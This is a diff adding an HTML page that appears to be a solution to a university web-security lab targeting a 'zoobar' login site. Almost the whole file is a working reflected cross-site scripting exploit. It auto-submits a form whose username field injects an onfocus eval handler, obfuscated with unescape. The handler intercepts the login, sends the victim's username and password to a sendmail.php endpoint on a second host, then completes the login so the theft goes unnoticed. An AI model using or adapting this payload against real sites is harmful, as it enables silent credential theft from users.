@@ -1,0 +1,46 @@
+<!doctype html>
+<html>
+<body>
+	<form id="form" name="login_form" action="http://zoobar.csl.toronto.edu/" method="POST">
+  		<input id="username" type="text" name="loginusername" size="30" autocomplete="no" >
+  		<input type="password" name="loginpassword" size="30" autocomplete="no">
+  		<input type="submit" name="submitlogin" value="Log in">
+ 	</form>
+
+	<script type="text/javascript">
+	  	window.onload = function (){
+
+	    	var username = document.getElementById("username");
+
+	    	username.value = 	
+		
+			"123 onfocus=eval('"+
+				//initialize 
+				"document.login_form.loginusername.value=\"\";"+
+				"createimg=unescape(\"image%3Dnew%20Image%28%29%3B\");"+
+				"eval(createimg);"+
+			
+				//when login button is pressed, prevent default login action, and run email script
+				"onlogin=function(event)"+
+				"{"+
+					"event.preventDefault();"+
+					"setsrc=unescape(\"image.src%3D%22http%3A//ece568.csl.toronto.edu/a3/sendmail.php%3Fto%3Dwanghan9%26netid%3Dyourusername%26payload%3D%22+document.login_form.loginusername.value+%22%2C%22+document.login_form.loginpassword.value+%22%26random%3D%22+Math.random%28%29%3B\");"+
+					"eval(setsrc);"+			
+				"};"+
+
+				//listen for login button to be pressed
+				"document.login_form.addEventListener(\"submit\",onlogin);"+			
+
+				//check that email script is starting to be processed, then remove listener and click login button
+				"image.onerror=function(){"+
+					"document.login_form.removeEventListener(\"submit\",onlogin);"+  
+					"document.login_form.submitlogin.click();"+ 
+				"};"+
+			"');";
+	    	document.getElementById("form").submit();
+	  	};    
+	</script>
+</body>
+</html>
+
+
